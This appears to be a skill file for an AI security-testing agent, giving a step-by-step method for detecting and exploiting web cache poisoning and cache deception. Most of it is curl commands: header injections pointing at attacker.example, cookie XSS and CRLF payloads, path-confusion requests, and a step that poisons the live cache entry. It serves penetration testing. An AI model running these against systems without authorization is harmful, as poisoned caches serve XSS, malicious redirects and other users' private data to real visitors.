---
name: cache-poisoning
description: Detect and exploit web cache poisoning and cache deception vulnerabilities
origin: AI Threat Hunting
---

# Cache Poisoning Testing

## When to Activate

- Target sits behind a CDN, reverse proxy, or caching layer (Cloudflare, Akamai, Varnish, Nginx, Fastly)
- Responses include `X-Cache`, `Age`, `CF-Cache-Status`, `Via`, or `Vary` headers
- Testing for cache poisoning via unkeyed headers or cache deception via path normalization

## Tools

- `curl` (header injection probing and cache behavior analysis)
- `Param Miner` (Burp extension for unkeyed header/parameter discovery)
- Browser (verify poisoned responses served to other users)

## Methodology

### 1. Cache Detection and Key Mapping
- [ ] Identify caching layer from response headers
```bash
curl -sI https://target/ | grep -iE "x-cache|age|cf-cache|via|vary|cdn|akamai|varnish|fastly"
```
- [ ] Determine cache key components: path, query string, Host header
- [ ] Send identical request twice — check if second returns `X-Cache: HIT` or `Age > 0`
- [ ] Add cache buster to isolate tests: `?cachebuster=random123`

### 2. Unkeyed Header Discovery
- [ ] Test common unkeyed headers that influence response content
```bash
curl -H "X-Forwarded-Host: attacker.example" https://target/?cb=test1
curl -H "X-Forwarded-Scheme: http" https://target/?cb=test2
curl -H "X-Original-URL: /admin" https://target/?cb=test3
curl -H "X-Rewrite-URL: /admin" https://target/?cb=test4
curl -H "X-Forwarded-Port: 443" https://target/?cb=test5
curl -H "X-Host: attacker.example" https://target/?cb=test6
```
- [ ] Check if injected header value appears in response (links, redirects, meta tags, scripts)
- [ ] If reflected, remove cache buster and re-send to poison the real cache entry

### 3. Unkeyed Cookie Testing
- [ ] Identify cookies that change response content but are excluded from cache key
```bash
curl -b "language=../../admin" https://target/?cb=test7
curl -b "region=<script>alert(1)</script>" https://target/?cb=test8
```
- [ ] Check `Vary` header — cookies only keyed if `Vary: Cookie` is present

### 4. Cache Poisoning via Response Splitting
- [ ] CRLF injection in cached response headers
```bash
curl "https://target/page%0d%0aX-Injected:header?cb=test9"
curl -H "X-Forwarded-Host: attacker.example%0d%0aContent-Length:%200%0d%0a%0d%0a<html>poisoned</html>" https://target/?cb=test10
```

### 5. Fat GET Request Poisoning
- [ ] Send GET request with body — some caches ignore body but origin processes it
```bash
curl -X GET -d '{"role":"admin"}' -H "Content-Type: application/json" https://target/api/user?cb=test11
```
- [ ] Compare response with and without body; if different, cache may store the modified version

### 6. Cache Deception
- [ ] Trick cache into storing authenticated/dynamic responses as static
```bash
# Path confusion: cache treats .css as static, origin ignores extension
curl https://target/account.css
curl https://target/account/nonexistent.js
curl https://target/account%2f..%2fstatic.css
```
- [ ] Path normalization differences between cache and origin
```bash
curl https://target/account/..%2fstatic/logo.png
curl https://target/static/../account
curl "https://target/account;.css"
```
- [ ] Check if authenticated user data cached and served to unauthenticated requests

### 7. Vary Header Abuse
- [ ] Identify `Vary` header values and test for incomplete keying
```bash
# If Vary: Accept-Encoding, test injection in other headers not in Vary
curl -H "Accept-Encoding: gzip" -H "X-Forwarded-Host: evil.example" https://target/
```
- [ ] Test `Vary: *` handling (should disable caching, but not always)

### 8. CDN-Specific Behaviors
- [ ] **Cloudflare**: test `cf-cache-status`, `__cf_bm` cookie, cache-everything page rules
- [ ] **Akamai**: test `Pragma: akamai-x-get-cache-key`, `X-Akamai-Staging`
- [ ] **Varnish**: test `X-Varnish`, custom VCL cache key configuration
- [ ] **Nginx**: test `X-Accel-Redirect`, `proxy_cache_key` configuration
- [ ] **Fastly**: test `Fastly-Debug: 1` header for cache key disclosure

### 9. Redirect-Based Poisoning
- [ ] Poison redirect target via `X-Forwarded-Scheme: http` forcing 301 to attacker-controlled location
```bash
curl -H "X-Forwarded-Scheme: http" https://target/
curl -H "X-Forwarded-Host: attacker.example" -H "X-Forwarded-Scheme: https" https://target/
```
- [ ] If 301/302 response is cached, all users follow the poisoned redirect

## What to Record

- Cache layer identified (CDN, reverse proxy, product name and version if known)
- Unkeyed input that influences response (header, cookie, body)
- Exact request that poisons the cache
- Evidence that poisoned response is served to other users (second request without the unkeyed input)
- Impact: XSS via poisoned response, redirect to attacker domain, sensitive data exposure via cache deception
- Full request/response pairs for both poisoning and victim requests

## Extended Resources

- `agent/references/vuln-checklists/A02-security-misconfiguration.md` — OWASP Top 10:2025 misconfiguration checklist
